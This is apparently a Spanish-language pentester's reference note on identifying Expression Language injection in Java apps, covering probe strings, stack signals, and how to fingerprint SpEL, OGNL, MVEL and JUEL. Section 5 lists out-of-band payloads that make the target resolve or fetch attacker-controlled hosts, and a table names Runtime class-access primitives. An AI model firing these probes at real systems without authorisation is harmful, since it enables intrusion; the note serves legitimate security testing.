---
tipo: meta
aliases:
  - identificar motor de EL
  - SpEL OGNL MVEL
tags:
  - meta/referencia
  - dominio/web
---

# EL injection - matriz de identificación

> [!info] Referencia pura, no un zettel
> Confirmar que hay evaluación de EL y de qué motor. Los payloads por motor están en [[EL injection payloads - matriz de referencia]]; el criterio, en [[MOC - EL injection]].

Identificar va antes que cualquier payload, igual que en [[SSTI - matriz de identificación]]. La diferencia es que acá la evaluación suele ser ciega, así que la identificación también.

## 1. ¿Hay evaluación?

Reflejada, cuando el resultado vuelve:

`${7*7}`
`#{7*7}`
`${7*7}` dentro de `__${7*7}__::.x` (Thymeleaf)
`%{7*7}` (OGNL en Struts)
`@{7*7}`
`*{7*7}` (SpEL en contexto de selección)

Devuelve `49` → hay evaluación del lado del servidor. Vuelve literal → probar los otros delimitadores, y si ninguno, pasar a confirmación ciega.

## 2. Distinguir de SSTI

EL injection es Java; SSTI puede ser cualquier lenguaje. La pila lo decide antes que el payload:

| Señal | Apunta a |
|---|---|
| Cabecera `Server` con Tomcat, JBoss, WildFly | Java → EL |
| Rutas `.action`, `.do` | Struts → OGNL |
| Trazas con `org.springframework` | Spring → SpEL |
| Trazas con `ognl.` | OGNL directo |
| `.jsp` en las rutas | JUEL / servlets |
| `${...}` evalúa pero es Python/PHP | No es EL, es [[MOC - SSTI]] |

Confirmar la pila con el reconocimiento normal antes de tirar payloads: un payload de SpEL contra un Freemarker no hace nada más que ensuciar el registro de errores.

## 3. Distinguir el motor

```
${7*7} o #{7*7} → 49
├─ Traza con SpelEvaluationException     → SpEL   (Spring)
├─ Traza con ognl.OgnlException          → OGNL   (Struts, o directo)
├─ Traza con org.mvel2                   → MVEL
└─ Contexto JSP / servlet, ${} evalúa    → JUEL   (limitado, sin RCE directo)

%{7*7} → 49                              → OGNL en Struts 2
__${7*7}__::.x → 49                      → SpEL vía Thymeleaf
```

## 4. Firmas por motor

| Motor | Framework | Delimitador | Acceso a clase | RCE directo |
|---|---|---|---|---|
| SpEL | Spring | `#{ }` `${ }` `*{ }` | `T(java.lang.Runtime)` | Sí |
| OGNL | Struts 2, directo | `%{ }` `${ }` | `@java.lang.Runtime@` | Sí |
| MVEL | varios | `@{ }` `${ }` | `Runtime` directo | Sí |
| JUEL | JSP/servlets | `${ }` `#{ }` | Restringido | **Raro** — sin acceso a Runtime por defecto |

JUEL es el que decepciona: es el EL de las JSP y por defecto **no** da acceso a `Runtime`. Si el motor resulta ser JUEL puro, el impacto suele quedar en lectura de beans del contexto, no en ejecución — parecido a [[SSTI - lectura sin ejecución]].

## 5. Confirmación ciega

Cuando nada vuelve en la respuesta, la evaluación es indirecta —mensaje de validación, registro, correo—. Se confirma por canal fuera de banda, un identificador por motor:

**SpEL**, resolución de DNS:
`#{T(java.net.InetAddress).getByName('spel.mi-dominio.com')}`

**OGNL**, petición HTTP:
`%{(new java.net.URL('http://mi-host/ognl')).getContent()}`

**MVEL**:
`@{java.net.InetAddress.getByName('mvel.mi-dominio.com')}`

El que llegue al servidor propio dice cuál era. Mismo criterio que el caso ciego de [[SSTI - matriz de identificación]] y de [[Command injection - canal fuera de banda]]: si el egress HTTP está cerrado, la consulta DNS suele salir igual.

## 6. Dónde buscar la evaluación indirecta

Puntos donde el framework evalúa EL sin que el desarrollador lo marque:

| Superficie | Motor típico |
|---|---|
| Mensaje de validación de bean sobre el valor rechazado | SpEL / JUEL |
| Nombre de parámetro (no el valor) | OGNL en Struts |
| Cabecera `Content-Type` en subida | OGNL en Struts |
| Expresión de ruteo o de seguridad de Spring | SpEL |
| Plantilla de Thymeleaf construida con entrada | SpEL |
| Registro que interpola EL | según la pila |

Los que no parecen campo de datos —nombre de parámetro, cabecera— son los que más rinden y menos se auditan. Ver [[EL - OGNL en el framework]].

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `${7*7}` vuelve literal | Delimitador equivocado o evaluación ciega. Probar § 1 y luego § 5 |
| `SpelEvaluationException` en la traza | Es SpEL, y además confirma que la entrada llega al evaluador |
| `49` pero es PHP/Python | No es EL. Ir a [[MOC - SSTI]] |
| El motor es JUEL | Probablemente sin RCE. Buscar lectura de beans |
| Nada vuelve nunca | Evaluación indirecta. Montar canal fuera de banda, § 5 |
| El payload da error de acceso a miembro | Sandbox activo. Ver el escape en la matriz de payloads |
| Struts pero el payload no funciona | Versión parcheada, o el CVE es de otro punto de entrada |

## Relacionadas

[[MOC - EL injection]] · [[EL injection payloads - matriz de referencia]] · [[SSTI - matriz de identificación]] · [[CWE-917 - Expression Language Injection]]
